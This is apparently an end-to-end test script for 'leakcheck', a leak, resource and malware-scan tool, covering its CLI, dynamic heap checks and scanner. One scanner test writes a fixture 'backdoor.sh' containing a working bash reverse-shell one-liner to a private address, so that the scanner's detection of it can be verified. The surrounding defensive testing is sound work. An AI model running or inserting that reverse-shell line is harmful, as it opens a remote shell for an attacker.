#!/usr/bin/env python3
"""End-to-end tests for leakcheck. Runs the real CLI against the programs in
tests/dynamic/programs and the sources in tests/static/cases.

usage: run_tests.py --build BUILD_DIR --source REPO_DIR [--suite cli|dynamic|static|scan|windows|all] [-k NAME]

On Windows the "dynamic" suite (the Linux programs) is replaced by "windows", which
runs the Windows programs (win_*.c and the portable ones) under the injected runtime.
"""
import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import traceback

ARGS = None
RESULTS = []
WIN = os.name == "nt"
EXE = ".exe" if WIN else ""


def leakcheck():
    return os.path.join(ARGS.build, "leakcheck" + EXE)


def prog(name):
    return os.path.join(ARGS.build, "test-programs", name + EXE)


def run(args, timeout=300, env=None):
    """env: extra environment variables for leakcheck (and so the target)."""
    return subprocess.run([leakcheck()] + args, capture_output=True, text=True, timeout=timeout,
                          encoding="utf-8", errors="replace",
                          env={**os.environ, **env} if env else None)


def run_json(args, timeout=300, env=None):
    """Runs leakcheck with a JSON report; returns (process, report)."""
    with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as f:
        path = f.name
    try:
        p = run(["-f", "json", "-o", path] + args, timeout, env)
        with open(path, encoding="utf-8") as f:
            text = f.read()
        report = json.loads(text) if text.strip() else None
        return p, report
    finally:
        os.unlink(path)


def types(report):
    return sorted(f["type"] for f in report["findings"])


def leak_totals(report):
    out = {}
    for f in report["findings"]:
        if f["type"] == "memory-leak":
            blocks, size = out.get(f["category"], (0, 0))
            out[f["category"]] = (blocks + f["blocks"], size + f["bytes"])
    return out


def top(f, stack):
    frames = f["stacks"].get(stack, [])
    return frames[0] if frames else {}


def find(report, type_):
    hits = [f for f in report["findings"] if f["type"] == type_]
    assert hits, f"no {type_} finding in {types(report)}"
    return hits[0]


def expect(cond, msg):
    if not cond:
        raise AssertionError(msg)


TESTS = []
POSIX_ONLY = set()  # tests that need a shell, /bin or a Linux program

IS_DARWIN = sys.platform == "darwin"
# Only what Darwin cannot do at all: no spin-lock API (its mutex stand-in
# reports mutex findings), no memfd/fexecve/execveat/pidfd/process_vm,
# no prctl/personality/capset/iopl, no dlmopen/getaddrinfo_a/sendmmsg/renameat2/
# umount2/64-bit aliases/mqueue, no unhookable-hidden-syscall cases, and no
# non-PIE binaries. Everything else runs: the programs are guarded for
# Darwin (see the CMake APPLE list) and the loops below drop single cases.
DARWIN_SKIP = {
    # spin locks do not exist: the stand-in reports mutex findings instead
    "lock_spin_relock",
    "lock_spin_inversion",
    "lock_destroy_other_spin",
    # the runtime reads glibc's mutex owner word for these; on Darwin the
    # checks are no-ops (see locks.cpp: destroyed, before_unlock,
    # before_orphan_lock, mutex other_holds)
    "lock_orphaned_by_fork",
    "lock_mutex_as_signal_is_not_a_relock",
    "lock_orphaned_by_thread_exit",
    "lock_foreign_unlock",
    "lock_destroy_other",
    "lock_lock_destroyed",
    "lock_unlock_destroyed",
    "lock_wait_destroyed",
    # no Linux-only requests to read or write another process
    "behavior_ptrace_poke",
    "behavior_ptrace_peek",
    "behavior_ptrace_setregset",
    "behavior_pidfd_steal",
    "behavior_inject_vm",
    "behavior_cred_vm_read",
    # no memfd: nothing can live only in memory
    "behavior_fileless",
    "behavior_fileless_path",
    "behavior_fileless_deleted",
    "behavior_masq_memfd",
    # no prctl/personality: renamed processes and ASLR stay Linux-only
    "behavior_masq_prctl",
    "behavior_masq_exe",
    "behavior_aslr_off",
    # no capabilities or port access
    "behavior_cap_set",
    "behavior_cap_raise",
    "behavior_iopl_on",
    "behavior_ioperm_on",
    # no dlmopen/getaddrinfo_a/sendmmsg/renameat2/umount2/64-bit aliases/mqueue
    "behavior_dropper_dlmopen",
    "behavior_host_getaddrinfo_a",
    "behavior_scan_sendmmsg",
    "behavior_persist_renameat2",
    "behavior_ransom_renameat2",
    "behavior_log_truncate64",
    "behavior_log_ftruncate64",
    "behavior_sys_umount2",
    "behavior_mq_world",
    "behavior_persist_preload",
    "behavior_api_open64",
    "behavior_api_openat64",
    "behavior_api___open_2",
    "behavior_api___open64_2",
    "behavior_api___openat_2",
    "behavior_api___openat64_2",
    "behavior_api_creat64",
    "behavior_api_fopen64",
    # no fexecve/execveat: the shell must come from an ordinary exec
    "behavior_api_fexecve",
    "behavior_api_execveat",
    "behavior_execveat_empty_path_is_a_reverse_shell",
    # Linux-only user and group identity calls
    "behavior_setresuid_root",
    "behavior_setfsuid_root",
    "behavior_setresgid_root",
    "behavior_setfsgid_root",
}


def posix_only(fn):
    POSIX_ONLY.add(fn.__name__)
    return fn


def test(suite):
    def deco(fn):
        TESTS.append((suite, fn))
        return fn
    return deco


# ---------------------------------------------------------------- cli -----

@test("cli")
def cli_usage_errors():
    expect(run([]).returncode == 1, "no arguments must fail with 1")
    p = run(["--help"])
    expect(p.returncode == 0 and "Usage:" in p.stdout, "--help prints usage")
    expect(run(["bogus", "x"]).returncode == 1, "unknown mode fails")
    expect(run(["dynamic"]).returncode == 1, "missing target fails")
    expect(run(["dynamic", "-f", "xml", "true"]).returncode == 1, "unknown format fails")
    expect(run(["dynamic", "--stack-depth", "0", "true"]).returncode == 1, "bad number fails")
    expect(run(["dynamic", "-o"]).returncode == 1, "option without value fails")
    p = run(["--error-exitcode", "0", "dynamic", "true"])
    expect(p.returncode == 1 and "1-255" in p.stderr, p.stderr)
    p = run(["--error-exitcode", "256", "dynamic", "true"])
    expect(p.returncode == 1 and "1-255" in p.stderr, p.stderr)
    p = run(["static", "--disable-rule", "no-such-rule", "."])
    expect(p.returncode == 3 and "unknown rule" in p.stderr and "--rule-list" in p.stderr,
           (p.returncode, p.stderr))


@test("cli")
def cli_version_names_the_build():
    p = run(["--version"])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
    first = p.stdout.splitlines()[0]
    expect(first.startswith("leakcheck "), first)
    expect("0.0.0-dev" not in first, f"the build did not generate its version: {first}")
    expect("classifier:" in p.stdout, p.stdout)
    expect(p.stdout == run(["-V"]).stdout, "-V and --version must agree")


@test("cli")
def cli_rule_list_is_an_inventory():
    p = run(["--rule-list", "-f", "json"])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
    rules = {r["id"]: r for r in json.loads(p.stdout)}
    expect(rules["command-injection"]["cwe"] == 78, rules.get("command-injection"))
    expect(rules["format-string"]["default_severity"] in ("error", "warning"),
           rules.get("format-string"))
    expect(rules["format-string"]["enabled"] is True, rules.get("format-string"))
    p = run(["--rule-list"])
    expect(p.returncode == 0 and "ID\tNAME\tCWE" in p.stdout, p.stdout[:200])
    expect("command-injection" in p.stdout, p.stdout[:200])


@test("cli")
def cli_list_shows_targets_without_running():
    d = os.path.join(ARGS.source, "tests", "static", "cases")
    p = run(["static", "--list", d])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
    listed = p.stdout.splitlines()
    expect(len(listed) >= 2, p.stdout[:500])
    expect(any(l.endswith("c_bugs.c") for l in listed), p.stdout[:500])
    for line in listed:
        expect(os.path.isfile(line), f"--list printed a file that is not there: {line}")
    p = run(["scan", "--list", d])
    expect(p.returncode == 0 and p.stdout.strip(), f"exit {p.returncode}: {p.stderr}")
    # dynamic --list must not fork: a program that does not exist still
    # lists cleanly (running it would exit 127).
    p = run(["dynamic", "--list", "/nonexistent-prog-xyz", "a", "b"])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
    expect(p.stdout == "/nonexistent-prog-xyz a b\n", repr(p.stdout))


@test("cli")
@posix_only
def cli_arguments_after_program_are_its_own():
    # Even options leakcheck also has, and a "--" of the program's own.
    echo = ["sh", "-c", 'printf "%s|" "$@"', "sh"]
    p, _ = run_json(["dynamic"] + echo + ["-f", "xml", "--", "-o"])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
    expect(p.stdout == "-f|xml|--|-o|", repr(p.stdout))
    # "--" before the program ends leakcheck's options.
    p, _ = run_json(["dynamic", "--"] + echo + ["a"])
    expect(p.returncode == 0 and p.stdout == "a|", (p.returncode, p.stdout, p.stderr))
    expect(run(["dynamic", "--"]).returncode == 1, "-- without a program fails")


@test("cli")
@posix_only
def cli_dynamic_timeout_kills_a_hang():
    import time
    started = time.time()
    p = run(["dynamic", "--timeout", "1", "sleep", "30"])
    expect(time.time() - started < 25, "the timeout killed sleep after ~1s")
    expect(p.returncode == 128 + 9, f"killed by SIGKILL: exit {p.returncode}")
    expect("timed out after 1s" in p.stdout, p.stdout[:500])
    expect(run(["dynamic", "--timeout", "0", "true"]).returncode == 1,
           "--timeout 0 is rejected")


@test("cli")
@posix_only
def cli_scan_skips_version_control_and_own_cache():
    import shutil
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    with tempfile.TemporaryDirectory() as d:
        os.makedirs(os.path.join(d, ".git", "objects"))
        with open(os.path.join(d, ".git", "objects", "pack.bin"), "w") as f:
            f.write(eicar)
        os.makedirs(os.path.join(d, ".leakcheck-cache"))
        with open(os.path.join(d, ".leakcheck-cache", "stale.bin"), "w") as f:
            f.write(eicar)
        with open(os.path.join(d, "clean.txt"), "w") as f:
            f.write("nothing to see here\n")
        # Recursion prunes stores and tool output: the packed EICAR is silent.
        p = run(["scan", "--list", d])
        expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
        expect(p.stdout.strip().endswith("clean.txt"), repr(p.stdout))
        # An explicit file path still scans: nothing was made unscannable.
        p = run(["scan", os.path.join(d, ".git", "objects", "pack.bin")])
        expect(p.returncode == 2, f"exit {p.returncode}: {p.stderr}")


@test("cli")
def cli_dynamic_json_and_sarif_need_an_output_file():
    # The program's stdout would be mixed into the report. Console is fine,
    # and static/scan json still go to stdout.
    for fmt in ("json", "sarif"):
        p = run(["-f", fmt, "dynamic", prog("no_bugs")])
        expect(p.returncode == 1 and p.stdout == "" and "-o" in p.stderr,
               f"{fmt}: exit {p.returncode}: {p.stderr!r} {p.stdout!r}")
        p = run(["-f", fmt, "-o", "-", "dynamic", prog("no_bugs")])
        expect(p.returncode == 1 and p.stdout == "" and "-o <file>" in p.stderr,
               f"{fmt} stdout: exit {p.returncode}: {p.stderr!r} {p.stdout!r}")
    p = run(["dynamic", prog("no_bugs")])
    expect(p.returncode == 0 and "hello" in p.stdout, (p.returncode, p.stdout, p.stderr))


@test("cli")
@posix_only
def cli_scan_finds_malware_marks_without_running_anything():
    import shutil
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    with tempfile.TemporaryDirectory() as d:
        def put(name, data):
            with open(os.path.join(d, name), "wb") as f:
                f.write(data if isinstance(data, bytes) else data.encode())
        put("eicar.com", eicar)
        put("invoice.pdf.exe", "hello")
        put("backdoor.sh", "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        put("clean.txt", "nothing to see\n")
        put("notes.sh", "#!/bin/sh\necho hello\n")
        shutil.copy("/bin/true", os.path.join(d, "report.pdf"))
        shutil.copy("/bin/true", os.path.join(d, "fine"))
        p, r = run_json(["scan", d])
        by = {}
        for f in r["findings"]:
            by.setdefault(os.path.basename(f["stacks"]["access"][0]["file"]), []).append(f["type"])
        expect(by == {"eicar.com": ["malware-signature"], "invoice.pdf.exe": ["masquerade"],
                      "backdoor.sh": ["reverse-shell"], "report.pdf": ["disguised-executable"]},
               f"{by}")
        expect(p.returncode == 2 and r["summary"]["files_analyzed"] == 7, f"exit {p.returncode}")
        sev = {f["type"]: f["severity"] for f in r["findings"]}
        expect(sev["malware-signature"] == "error" and sev["masquerade"] == "error", f"{sev}")
        # one file as the target; a clean tree
        p, r = run_json(["scan", os.path.join(d, "eicar.com")])
        expect(p.returncode == 2 and types(r) == ["malware-signature"], f"{types(r)}")
        os.unlink(os.path.join(d, "eicar.com"))
        for n in ("invoice.pdf.exe", "backdoor.sh", "report.pdf"):
            os.unlink(os.path.join(d, n))
        p, r = run_json(["scan", d])
        expect(p.returncode == 0 and r["findings"] == [], f"exit {p.returncode}: {types(r)}")
    expect(run(["scan", "/definitely/not/here"]).returncode == 1, "a missing target fails")


@test("scan")
def scan_ai_features_and_verdicts():
    import struct

    def pe():
        """A minimal 32-bit PE: one .text section, no imports."""
        b = bytearray(0x400)
        b[0:2] = b"MZ"
        struct.pack_into("<I", b, 0x3c, 0x80)
        b[0x80:0x84] = b"PE\0\0"
        struct.pack_into("<HH", b, 0x84, 0x14C, 1)       # i386, one section
        struct.pack_into("<H", b, 0x94, 0xE0)           # optional header size
        opt = 0x98
        struct.pack_into("<H", b, opt, 0x10B)           # PE32
        struct.pack_into("<I", b, opt + 4, 0x200)       # SizeOfCode
        struct.pack_into("<I", b, opt + 16, 0x1000)     # AddressOfEntryPoint
        struct.pack_into("<II", b, opt + 32, 0x1000, 0x200)
        struct.pack_into("<I", b, opt + 56, 0x2000)     # SizeOfImage
        struct.pack_into("<I", b, opt + 60, 0x200)      # SizeOfHeaders
        struct.pack_into("<H", b, opt + 68, 2)          # GUI
        struct.pack_into("<I", b, opt + 92, 16)
        sec = opt + 0xE0
        b[sec:sec + 5] = b".text"
        struct.pack_into("<IIII", b, sec + 8, 0x200, 0x1000, 0x200, 0x200)
        struct.pack_into("<I", b, sec + 36, 0x60000020)  # code | read | execute
        b[0x200:0x205] = b"\x55\x89\xe5\xc3\x90"
        return bytes(b)

    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "setup.exe"), "wb") as f:
            f.write(pe())
        with open(os.path.join(d, "notes.txt"), "w", encoding="utf-8") as f:
            f.write("nothing to see\n")

        # the numbers the model is trained on, one line per Windows program
        p = run(["ai-features", d])
        expect(p.returncode == 0, p.stderr)
        lines = p.stdout.splitlines()
        header = lines[0].split()
        expect(header[0] == "#features" and len(header) > 10, header[:3])
        expect(len(lines) == 2, lines)
        path, values = lines[1].split("\t")
        expect(os.path.basename(path) == "setup.exe", path)
        expect(len(values.split()) == len(header) - 1, "one value per named feature")
        expect("of " in p.stderr and "Windows program" in p.stderr, p.stderr)

        def model(path_leaf, threshold=0.5, count=None):
            """A one-leaf model: the score is the sigmoid of the leaf."""
            path = os.path.join(d, f"model-{path_leaf}-{threshold}-{count}.ai")
            with open(path, "w", encoding="utf-8") as f:
                f.write("leakcheck-ai 1\n")
                f.write(f"features {count or len(header) - 1}\n")
                f.write("trained_on the test suite\n")
                f.write(f"threshold {threshold}\n")
                f.write("trees 1\ntree 1\n")
                f.write(f"-1 0 0 0 1 {path_leaf}\n")
                f.write("end\n")
            return path

        p, r = run_json(["scan", "--ai", "--ai-model", model(3), d])
        expect(p.returncode == 2, f"exit {p.returncode}: {p.stderr}")
        verdicts = [f for f in r["findings"] if f["type"] == "ai-classifier"]
        expect(len(verdicts) == 1, types(r))
        hit = verdicts[0]
        expect(hit["severity"] == "warning", hit["severity"])
        expect(os.path.basename(hit["stacks"]["access"][0]["file"]) == "setup.exe", hit)
        expect("the test suite" in hit["message"] and "95%" in hit["message"], hit["message"])
        expect("not a matched rule" in hit["message"], hit["message"])

        # a program the model calls normal, and the same model with a higher bar
        p, r = run_json(["scan", "--ai", "--ai-model", model(-3), d])
        expect(not [f for f in r["findings"] if f["type"] == "ai-classifier"], types(r))
        p, r = run_json(["scan", "--ai", "--ai-model", model(3), "--ai-threshold", "0.99", d])
        expect(not [f for f in r["findings"] if f["type"] == "ai-classifier"], types(r))
        # a model trained on a different feature set is not used at all
        p, r = run_json(["scan", "--ai", "--ai-model", model(3, count=len(header)), d])
        expect(not [f for f in r["findings"] if f["type"] == "ai-classifier"], types(r))

        # a missing model, and a threshold that is not a probability
        p = run(["scan", "--ai", "--ai-model", os.path.join(d, "absent.ai"), d])
        expect(p.returncode == 1 and "cannot open" in p.stderr, p.stderr)
        expect("train_ai.py" in p.stderr, p.stderr)
        p = run(["scan", "--ai", "--ai-model", model(3), "--ai-threshold", "2", d])
        expect(p.returncode == 1 and "between 0 and 1" in p.stderr, p.stderr)


@test("scan")
def scan_ai_leaves_resource_files_alone():
    """The classifier judges programs, not resource files.

    On a real Windows installation resource-only files were three quarters of
    its false alarms: a .mui file has no code to run.
    """
    import struct

    def pe(subsystem, entry, section_flags):
        b = bytearray(0x400)
        b[0:2] = b"MZ"
        struct.pack_into("<I", b, 0x3C, 0x80)
        b[0x80:0x84] = b"PE\0\0"
        struct.pack_into("<HH", b, 0x84, 0x14C, 1)
        struct.pack_into("<H", b, 0x94, 0xE0)
        opt = 0x98
        struct.pack_into("<H", b, opt, 0x10B)
        struct.pack_into("<I", b, opt + 16, entry)
        struct.pack_into("<II", b, opt + 32, 0x1000, 0x200)
        struct.pack_into("<I", b, opt + 56, 0x2000)
        struct.pack_into("<I", b, opt + 60, 0x200)
        struct.pack_into("<H", b, opt + 68, subsystem)
        struct.pack_into("<I", b, opt + 92, 16)
        sec = opt + 0xE0
        b[sec:sec + 5] = b".text"
        struct.pack_into("<IIII", b, sec + 8, 0x200, 0x1000, 0x200, 0x200)
        struct.pack_into("<I", b, sec + 36, section_flags)
        return bytes(b)

    with tempfile.TemporaryDirectory() as d:
        with open(os.path.join(d, "strings.dll.mui"), "wb") as f:
            f.write(pe(2, 0, 0x40000040))       # resources, nothing to run
        with open(os.path.join(d, "cdrom.sys"), "wb") as f:
            f.write(pe(1, 0x1000, 0x60000020))  # a kernel driver, and judged
        with open(os.path.join(d, "setup.exe"), "wb") as f:
            f.write(pe(2, 0x1000, 0x60000020))  # a user-mode program
        # native-subsystem programs exist and malware uses them: they are judged
        with open(os.path.join(d, "smss.exe"), "wb") as f:
            f.write(pe(1, 0x1000, 0x60000020))
        model = os.path.join(d, "always.ai")
        with open(model, "w", encoding="utf-8") as f:
            f.write("leakcheck-ai 1\nfeatures 49\ntrained_on the test suite\n"
                    "threshold 0.5\ntrees 1\ntree 1\n-1 0 0 0 1 3\nend\n")
        _, r = run_json(["scan", "--ai", "--ai-model", model, d])
        flagged = {os.path.basename(f["stacks"]["access"][0]["file"])
                   for f in r["findings"] if f["type"] == "ai-classifier"}
        expect(flagged == {"setup.exe", "smss.exe", "cdrom.sys"}, (types(r), flagged))

        # The trainer reads exactly the rows the scanner judges: a resource-only
        # image is left out there too, so the model cannot be trained to call one
        # malware and then meet it again as a false alarm.
        p = run(["ai-features", d])
        listed = {os.path.basename(line.split("\t")[0]) for line in p.stdout.splitlines()
                  if line and not line.startswith("#")}
        expect(listed == {"setup.exe", "smss.exe", "cdrom.sys"}, (p.stdout, listed))
        expect("1 resource-only image(s) left out" in p.stderr, p.stderr)


@test("cli")
def cli_missing_program():
    p = run(["dynamic", "./definitely-not-here"])
    expect(p.returncode == 127, f"exit {p.returncode}, want 127")
    expect("cannot run" in p.stderr, p.stderr)


# ------------------------------------------------------------ dynamic -----

@test("dynamic")
def clean_program_is_silent():
    p, r = run_json(["dynamic", prog("no_bugs")])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stderr}")
    expect(r["findings"] == [], f"unexpected findings {types(r)}")
    expect(r["processes"][0]["complete"] and r["processes"][0]["leak_check"], "scan ran")


@test("dynamic")
def leak_classification_matches_valgrind():
    p, r = run_json(["dynamic", prog("leaks")])
    expect(p.returncode == 2, f"exit {p.returncode}")
    totals = leak_totals(r)
    expect(totals.get("definite") == (2, 132), totals)
    expect(totals.get("indirect") == (2, 64), totals)
    expect(totals.get("possible") == (1, 64), totals)
    expect("reachable" not in totals, "reachable hidden by default")
    big = [f for f in r["findings"] if f["category"] == "definite" and f["bytes"] == 100][0]
    frame = top(big, "alloc")
    expect(frame.get("function") == "lose_buffer" and frame.get("file", "").endswith("leaks.c"), frame)
    expect(frame.get("line") == 16, frame)
    p, hidden = run_json(["dynamic", "--disable-rule", "memory-leak", prog("leaks")])
    expect(p.returncode == 0 and hidden["findings"] == [], (p.returncode, types(hidden)))
    expect(any("disabled rule policy" in n for n in hidden["notes"]), hidden["notes"])


@test("dynamic")
def show_reachable_lists_global_block():
    _, r = run_json(["dynamic", "--show-reachable", prog("leaks")])
    reach = [f for f in r["findings"] if f.get("category") == "reachable"]
    expect(any(f["bytes"] == 40 and top(f, "alloc").get("function") == "main" for f in reach),
           [(f["bytes"], top(f, "alloc").get("function")) for f in reach])


@test("dynamic")
def no_leak_check_option():
    p, r = run_json(["dynamic", "--no-leak-check", prog("leaks")])
    expect(r["findings"] == [] and p.returncode == 0, types(r))


HEAP_CASES = {
    "double-free": ("double-free", "double_free", None),
    "double-free-reuse": ("double-free", "double_free_after_reuse", None),
    "overflow": ("heap-buffer-overflow", "overflow", "past the end"),
    "underflow": ("heap-buffer-underflow", "underflow", "before the start"),
    "overflow-live": ("heap-buffer-overflow", None, "at exit"),
    "uaf-write": ("heap-use-after-free", None, "write to freed memory"),
    "free-stack": ("invalid-free", "invalid_free_stack", "stack of thread"),
    "free-global": ("invalid-free", "invalid_free_global", "static memory"),
    "free-interior": ("invalid-free", "invalid_free_interior", "inside a 32-byte block"),
    "realloc-stale": ("heap-use-after-free", None, "write to freed memory"),
    "realloc-freed": ("heap-use-after-free", "realloc_freed", "realloc()"),
}


def check_heap_case(binary, case):
    want_type, want_fn, want_text = HEAP_CASES[case]
    p, r = run_json(["dynamic", prog(binary), case])
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")
    expect(types(r) == [want_type], f"{case}: {types(r)}")
    f = r["findings"][0]
    if want_fn:
        expect(top(f, "access").get("function") == want_fn, f"{case}: {top(f, 'access')}")
    if want_text:
        expect(want_text in f["message"], f"{case}: {f['message']}")
    if want_type in ("double-free", "heap-use-after-free") and case != "realloc-freed":
        expect(f["stacks"].get("alloc") and f["stacks"].get("free"), f"{case}: needs alloc+free stacks")


for _case in HEAP_CASES:
    def _make(case):
        def fn():
            check_heap_case("heap_errors", case)
        fn.__name__ = "heap_" + case.replace("-", "_")
        return fn
    test("dynamic")(_make(_case))


@test("dynamic")
def non_pie_executable_symbolizes():
    # Darwin links everything PIE: the same symbolization check runs on the
    # ordinary binary there (the non-PIE binary is Linux-only).
    binary = "heap_errors" if IS_DARWIN else "heap_errors_nopie"
    check_heap_case(binary, "double-free")
    _, r = run_json(["dynamic", prog(binary), "double-free"])
    frame = top(r["findings"][0], "access")
    expect(frame.get("file", "").endswith("heap_errors.c") and frame.get("line", 0) > 0, frame)


@test("dynamic")
def use_after_free_read_needs_guard_pages():
    _, r = run_json(["dynamic", prog("heap_errors"), "uaf-read"])
    expect(r["findings"] == [], "a read leaves no trace without guard pages")
    p, r = run_json(["dynamic", "--guard-every", "1", prog("heap_errors"), "uaf-read"])
    f = find(r, "heap-use-after-free")
    expect("read of freed memory" in f["message"], f["message"])
    expect(top(f, "access").get("function") == "use_after_free_read", top(f, "access"))
    expect(f["stacks"].get("free") and f["stacks"].get("alloc"), "free and alloc stacks")


@test("dynamic")
def guard_pages_keep_detection_working():
    for case in ("double-free", "uaf-write", "overflow"):
        _, r = run_json(["dynamic", "--guard-every", "1", prog("heap_errors"), case])
        expect(len(r["findings"]) == 1, f"{case}: {types(r)}")
    _, r = run_json(["dynamic", "--guard-every", "1", prog("leaks")])
    expect(leak_totals(r).get("definite") == (2, 132), leak_totals(r))


@test("dynamic")
def cxx_mismatches():
    for case, msg in [("malloc-delete", "malloc() was released with operator delete"),
                      ("new-free", "operator new was released with free()"),
                      ("array-scalar", "operator new[] was released with operator delete")]:
        _, r = run_json(["dynamic", prog("cxx_errors"), case])
        f = find(r, "alloc-dealloc-mismatch")
        expect(msg in f["message"], f"{case}: {f['message']}")
    _, r = run_json(["dynamic", prog("cxx_errors"), "sized-delete"])
    expect(types(r) == ["free-size-mismatch"], types(r))


@test("dynamic")
def cxx_leak_and_double_delete():
    _, r = run_json(["dynamic", prog("cxx_errors"), "leak"])
    totals = leak_totals(r)
    expect(totals.get("definite") == (1, 24) and totals.get("indirect") == (1, 4000), totals)
    _, r = run_json(["dynamic", prog("cxx_errors"), "double-delete"])
    expect("double-free" in types(r), types(r))
    bad = [f for f in r["findings"] if f["type"] == "invalid-free"]
    expect(bad and "fill pattern for freed memory" in bad[0]["message"], types(r))


@test("dynamic")
def cxx_idioms_are_silent():
    p, r = run_json(["dynamic", prog("cxx_errors"), "clean"])
    expect(p.returncode == 0 and r["findings"] == [], types(r))


@test("dynamic")
def original_mixed_bugs_program():
    _, r = run_json(["dynamic", prog("mixed_bugs")])
    expect(sorted(set(types(r))) == ["double-free", "invalid-free", "memory-leak"], types(r))


@test("dynamic")
def threads_clean_and_leaking():
    p, r = run_json(["dynamic", prog("threads")])
    expect(p.returncode == 0 and r["findings"] == [], types(r))
    _, r = run_json(["dynamic", prog("threads"), "leak"])
    expect(leak_totals(r).get("definite", (0, 0))[0] == 8, leak_totals(r))


@test("dynamic")
def block_held_by_live_thread_is_not_lost():
    _, r = run_json(["dynamic", prog("threads"), "held"])
    lost = {k: v for k, v in leak_totals(r).items() if k in ("definite", "possible")}
    expect(not lost, lost)


@test("dynamic")
def fork_child_ignored_unless_traced():
    _, r = run_json(["dynamic", prog("processes"), "fork"])
    expect(r["findings"] == [], types(r))
    _, r = run_json(["dynamic", "--trace-children", prog("processes"), "fork"])
    leaks = [f for f in r["findings"] if f["type"] == "memory-leak" and f["bytes"] == 77]
    expect(leaks and len(r["processes"]) == 2, (types(r), r["processes"]))


@test("dynamic")
def exec_and_spawn_run_normally():
    for case in ("exec", "spawn"):
        p, r = run_json(["dynamic", prog("processes"), case])
        expect(p.returncode == 0 and r["findings"] == [], f"{case}: {p.returncode} {types(r)}")


@test("dynamic")
def exit_from_deep_frames():
    p, r = run_json(["dynamic", prog("processes"), "deep-exit"])
    expect(p.returncode == 2, f"exit {p.returncode}: a leak outranks the program's status")
    totals = leak_totals(r)
    expect(totals.get("definite") == (1, 55), totals)


@test("dynamic")
def underscore_exit_still_reports():
    _, r = run_json(["dynamic", prog("processes"), "underscore-exit"])
    expect(leak_totals(r).get("definite") == (1, 44), leak_totals(r))


@test("dynamic")
def crash_and_status_pass_through():
    p, r = run_json(["dynamic", prog("processes"), "crash"])
    expect(p.returncode == 128 + 11, f"exit {p.returncode}")
    expect(r["target"]["status"] == "signaled" and r["target"]["signal"] == 11, r["target"])
    expect(not r["processes"][0]["complete"], "crash leaves the stream incomplete")
    p, _ = run_json(["dynamic", prog("processes"), "status"])
    expect(p.returncode == 7, f"exit {p.returncode}")


@test("dynamic")
def allocation_api_semantics():
    p, r = run_json(["dynamic", prog("alloc_api")])
    expect(p.returncode == 0, f"exit {p.returncode}: {p.stdout}{p.stderr}")
    expect(r["findings"] == [], types(r))


@test("dynamic")
def fast_unwind_gives_same_stacks():
    _, slow = run_json(["dynamic", prog("heap_errors"), "double-free"])
    _, fast = run_json(["dynamic", "--fast-unwind", prog("heap_errors"), "double-free"])
    def names(r):
        f = r["findings"][0]
        return {k: [fr.get("function") for fr in v] for k, v in f["stacks"].items()}
    expect(names(slow) == names(fast), (names(slow), names(fast)))
    _, r = run_json(["dynamic", "--fast-unwind", prog("threads"), "leak"])
    expect(leak_totals(r).get("definite", (0, 0))[0] == 8, leak_totals(r))


RESOURCE_CASES = {
    # case: (type, category, function on the primary stack, message text)
    "leak-fd": ("resource-leak", "fd", "leak_fd", "from open() is still open"),
    "leak-file": ("resource-leak", "stream", "leak_file", "from fopen() is never closed"),
    "leak-dir": ("resource-leak", "dir", "leak_dir", "from opendir() is never closed"),
    "leak-pipe": ("resource-leak", "stream", "leak_pipe", "never waited for"),
    "leak-socket": ("resource-leak", "fd", "leak_socket", "from socket()"),
    "leak-mkstemp": ("resource-leak", "fd", "leak_mkstemp", "from mkstemp()"),
    "leak-fcntl-dup": ("resource-leak", "fd", "leak_fcntl_dup", "from fcntl()"),
    "leak-thread": ("resource-leak", "thread", "leak_thread", "never joined or detached"),
    "leak-child": ("resource-leak", "process", "leak_child", "never waited for"),
    "inherit": ("inherited-descriptor", "fd", "inherit",
                "from open() is inherited by the program started by system()"),
    "inherit-exec": ("inherited-descriptor", "fd", "inherit_exec",
                     "from open() is inherited by the program started by execlp()"),
    "double-close": ("double-close", "fd", "double_close", "already closed"),
    "fd-reuse-close": ("double-close", "fd", "fd_reuse_close", "already closed"),
    "double-fclose": ("double-close", "stream", "double_fclose", "already closed"),
    "fclose-popen": ("alloc-dealloc-mismatch", "stream", "fclose_popen", "use pclose()"),
    "close-after-fclose": ("double-close", "fd", "close_after_fclose", "already closed"),
    "scm-rights": ("resource-leak", "fd", "scm_rights", "from recvmsg()"),
    "join-twice": ("double-join", "thread", "join_twice", "already joined"),
    "join-detached": ("double-join", "thread", "join_detached", "was detached"),
}


def check_resource_case(case):
    want_type, want_cat, want_fn, want_text = RESOURCE_CASES[case]
    p, r = run_json(["dynamic", prog("resources"), case])
    expect(p.returncode == 2, f"{case}: exit {p.returncode}")
    expect(types(r) == [want_type], f"{case}: {types(r)}")
    f = r["findings"][0]
    expect(f.get("category") == want_cat and want_text in f["message"], f"{case}: {f}")
    stack = "alloc" if want_type == "resource-leak" else "access"
    expect(top(f, stack).get("function") == want_fn, f"{case}: {top(f, stack)}")
    if want_type == "double-close" and case != "close-after-fclose":
        expect(f["stacks"].get("free") and f["stacks"].get("alloc"), f"{case}: needs both stacks")
    if case == "double-fclose":  # a second fclose passed to libc aborts
        expect(r.get("target", {}).get("status") == "exited", r.get("target"))
    if want_type == "double-join":
        expect(f["stacks"].get("free"), f"{case}: needs the first join's stack")


for _case in RESOURCE_CASES:
    def _make_resource(case):
        def fn():
            check_resource_case(case)
        fn.__name__ = "resource_" + case.replace("-", "_")
        return fn
    test("dynamic")(_make_resource(_case))


LOCK_CASES = {
    # case: (type, function where the problem shows, message text)
    "inversion": ("lock-order-inversion", "b_then_a", "opposite order"),
    "cycle": ("lock-order-inversion", "lock_pair", "a cycle of 3 locks"),
